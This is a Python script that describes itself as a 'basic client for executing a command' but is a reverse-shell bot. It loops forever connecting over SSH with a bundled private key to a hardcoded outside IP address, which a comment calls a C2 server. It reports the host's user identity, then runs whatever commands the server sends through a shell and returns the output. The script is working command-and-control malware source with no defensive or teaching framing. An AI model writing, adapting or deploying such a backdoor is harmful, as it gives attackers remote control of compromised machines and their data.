#!/bin/env python3

# This is a basic client for executing a command

# Supress warnings
import warnings
warnings.filterwarnings("ignore")

import os
import sys
import time
import signal
import threading
import paramiko
import subprocess

parent_dir = os.path.dirname(os.path.abspath(__file__))


# Global variables to track SSH client and session
ssh_client = None
ssh_session = None
process = None

def exit_gracefully():
    global ssh_client, ssh_session, process
    
    print("\n\n[!] Exiting gracefully...")

    # Close SSH session and client if open
    if ssh_session and ssh_session.active:
        ssh_session.close()
        print("[!] SSH session closed.")
    
    if ssh_client:
        ssh_client.close()
        print("[!] SSH client disconnected.")
    
    # Terminate subprocess if it’s still running
    if process and process.poll() is None:
        process.terminate()
        process.wait()
        print("[!] Subprocess terminated.")

    # Exit the program
    sys.exit(0)

# Signal handler function to catch Ctrl+C
def signal_handler(sig, frame):
    exit_gracefully()

# Register the signal handler for SIGINT (Ctrl+C)
signal.signal(signal.SIGINT, signal_handler)


def exec_underlying_command(command):
    if isinstance(command, bytes):
        command = command.decode()
    print(f"[*] Received command:\n\t'{command}'")

    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()  # Get the output and errors if any

    result = None
    if process.returncode == 0:  # Check if the command was successful
        result = stdout.decode().strip()
    else:
        result = stderr.decode().strip()

    return result.rstrip()

command = "whoami".encode()
user = exec_underlying_command(command)


# Thread for counting 
timeout = False
def max_timeout(seconds=20):
    global timeout
    time.sleep(seconds)
    timeout = True



def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
    global ssh_client, ssh_session, timeout
    ssh_client = paramiko.SSHClient()

    try:
        # Load host keys if available, or use AutoAddPolicy to add new ones
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Load the private key from a file
        private_key = paramiko.RSAKey.from_private_key_file(key_file)
        
        # Connect to the SSH server using the private key
        ssh_client.connect(ip, username=user, pkey=private_key, port=port)

        # Open a session and execute the command
        ssh_session = ssh_client.get_transport().open_session()
            
        server_instructions = None

        #while server_instructions != "kill":
        if ssh_session.active:
            print("[!] Sending identity!")
            ssh_session.send(bot_user.encode())

            # Start the timeout thread
            timeout = False
            timeout_thread = threading.Thread(target=max_timeout, args=(600,))
            timeout_thread.daemon = True
            timeout_thread.start()

            print("[!] Listening for instructions ...")
            while not timeout:
                try:
                    ssh_session.settimeout(1.0)
                    server_instructions = ssh_session.recv(1024).decode().strip()
                    server_instructions = server_instructions.encode()

                    if server_instructions:
                        print(f"[!] Received command: {server_instructions}")

                        # Handle termination command
                        if server_instructions == 'kill':
                            print("[!] Session terminated by the server!")
                            exit_gracefully()
                        if server_instructions == 'exit':
                            print("[*] Session finished by the server. Continuing to next loop.")
                            ssh_session.close()
                            ssh_client.close()
                            return

                        # Execute command on the channel and capture output
                        print("Trying to execute the command")
                        try:
                            response = exec_underlying_command(server_instructions)
                        except Exception as e:
                            response = f"Command failed:\t{e}"

                        ssh_session.send(response.encode())

                        print("[!] Response sent!")

                        #server_instructions = "kill"
                        ssh_session.close()
                        ssh_client.close()
                        return

                except Exception as e:
                    pass


            ssh_session.close()
            ssh_client.close()
            response = f"Timeout while listening new instructions!"
            ssh_session.send(response.encode())
            print("[!] Response sent!")

            return response

                
        time.sleep(1)

    except Exception as e:
        #print(f"[!] Error occurred: {e}")
        if ssh_session:
            ssh_session.close()
        if ssh_client:
            ssh_client.close()
        return f"Error: {e}"


if __name__ == "__main__":

    #global user
    auth_path = os.path.join(parent_dir, 'mechanism')

    # Try forever the commands
    while True:
        try:
            ssh_rev_shell('34.204.78.186', 'ubuntu', auth_path, user, 64000)
        except Exception as e:
            pass
            #print(f"[!] Reconnection to C2 server failed!\n{e}\n")

        # How frequent request a command
        time.sleep(0.5)
